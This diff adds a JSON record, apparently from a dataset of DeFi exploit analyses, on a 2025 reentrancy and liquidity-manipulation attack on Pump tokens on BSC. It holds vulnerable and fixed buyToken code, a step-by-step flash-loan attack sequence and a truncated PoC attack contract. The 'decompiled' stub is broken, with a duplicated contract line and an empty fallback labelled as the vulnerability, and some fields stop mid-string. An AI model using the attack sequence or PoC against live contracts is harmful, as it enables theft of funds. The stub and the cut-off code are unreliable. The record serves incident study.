@@ -1,0 +1,40 @@
+{
+ "id": "2025__2025-03-05_PumpToken_BuyTokenReentrancy",
+ "source_file": "2025/2025-03-05_PumpToken_BuyTokenReentrancy.md",
+ "title": "Pump Token — buyToken Reentrancy + Liquidity Manipulation Analysis",
+ "date": "2025-03-05",
+ "protocol": "Pump",
+ "chain": "BSC",
+ "loss_raw": "~11.29 BNB ($6,400)",
+ "loss_usd": 6400.0,
+ "root_cause": "Reentrancy possible during token purchase after liquidity is added to the LP pair in `buyToken()`, enabling price manipulation and profit extraction",
+ "attack_tx": "0xdebaa13f...",
+ "vulnerable_contract": "TAGAIFUN, GROK, PEPE, TEST token contracts (BSC)",
+ "classes": [
+  "reentrancy"
+ ],
+ "code_before": [
+  "❌ Vulnerable code: allows reentrancy and liquidity manipulation in buyToken\nfunction buyToken(\n    uint256 expectAmount,\n    address sellsman,\n    uint16 slippage,\n    address receiver\n) external payable returns (uint256) {\n    // No reentrancy guard\n    // Logic that adds liquidity to LP pair first\n    if (pairLiquidityNeeded()) {\n        _addLiquidityToPair(); // ← liquidity added here\n    }\n    // Token purchase possible using the added liquidity\n    return _buyTokens(msg.value, receiver);\n}\n\n// Attack pattern:\n// 1) Small purchase → trigger initial liquidity setup\n// 2) Add large WBNB to LP pair → shift pool price\n// 3) Buy large amount of tokens (at low price)\n// 4) Sell held tokens → WBNB (at high price)\n\n//",
+  "// File: PumpToken_decompiled.sol\ncontract PumpToken {\ncontract PumpToken {\n\n    // This contract has no standard ABI selectors.\n    // Likely a minimal proxy (EIP-1167), fallback-only, or custom dispatcher.\n\n    fallback() external payable {  // ❌ Vulnerability\n        // TODO: decompilation logic not implemented\n    }\n\n}"
+ ],
+ "code_after": [
+  "✅ Safe code\nfunction buyToken(...) external payable nonReentrant returns (uint256) {\n    require(msg.value >= MIN_BUY_AMOUNT, \"Too small\");\n    // Handle liquidity addition and purchase atomically with manipulation prevention\n    return _buyTokens(msg.value, receiver);\n}"
+ ],
+ "steps": [
+  "→ [1] Flash loan 100 WBNB from PancakeSwap V3",
+  "→ [2] Unwrap WBNB → BNB",
+  "→ [Repeat for each token (TAGAIFUN, GROK, PEPE, TEST)]",
+  "→ [3] Call buyToken() with small amount (0.001 BNB)",
+  "→ [4] Transfer 1 WBNB directly to LP pair",
+  "→ [5] pair.mint(address(this)) — obtain LP tokens",
+  "→ [6] Call buyToken() with large amount (20 BNB)",
+  "→ [7] Sell acquired tokens → WBNB (extract profit)",
+  "→ [8] Wrap BNB → WBNB",
+  "→ [9] Repay flash loan (100 WBNB + fee)",
+  "→ [10] ~11.29 BNB profit"
+ ],
+ "other_code": [
+  "Attacker\n  │\n  ├─→ [1] Flash loan 100 WBNB from PancakeSwap V3\n  │\n  ├─→ [2] Unwrap WBNB → BNB\n  │\n  ├─→ [Repeat for each token (TAGAIFUN, GROK, PEPE, TEST)]\n  │         │\n  │         ├─→ [3] Call buyToken() with small amount (0.001 BNB)\n  │         │         └─ Triggers initial liquidity setup\n  │         │\n  │         ├─→ [4] Transfer 1 WBNB directly to LP pair\n  │         │\n  │         ├─→ [5] pair.mint(address(this)) — obtain LP tokens\n  │         │\n  │         ├─→ [6] Call buyToken() with large amount (20 BNB)\n  │         │         └─ Buy large amount of tokens after liquidity increase\n  │         │\n  │         ├─→ [7] Sell acquired tokens → WBNB (extract profit)\n  │         │\n  │         └─ Repeat for next token\n  │\n  ├─→ [8] Wrap BNB → WBNB\n  │\n  ├─→ [9] Repay flash loan (100 WBNB +",
+  "// Actual PoC code (based on DeFiHackLabs verified code)\n\ncontract AttackContract {\n    address attacker;\n    address[] tokenPairs;\n    uint256 borrowAmount = 100_000_000_000_000_000_000; // 100 WBNB\n\n    function start(address[] memory _tokenPairs) public {\n        tokenPairs = _tokenPairs;\n        // [1] PancakeSwap V3 flash loan\n        IPancakeV3PoolActions(PANCAKE_V3_POOL_BUSD_WBNB)\n            .flash(address(this), 0, borrowAmount, \"\");\n    }\n\n    function pancakeV3FlashCallback(uint256 fee0, uint256 fee1, bytes calldata data) external {\n        uint256 balanceOfWBNB = TokenHelper.getTokenBalance(WBNB_ADDR, address(this));\n        WBNB(WBNB_ADDR).withdraw(balanceOfWBNB); // Unwrap WBNB → BNB\n\n        // Repeat same pattern for all 4 tokens\n        for (uint256 i = 0; i < tokenPairs.l"
+ ]
+}
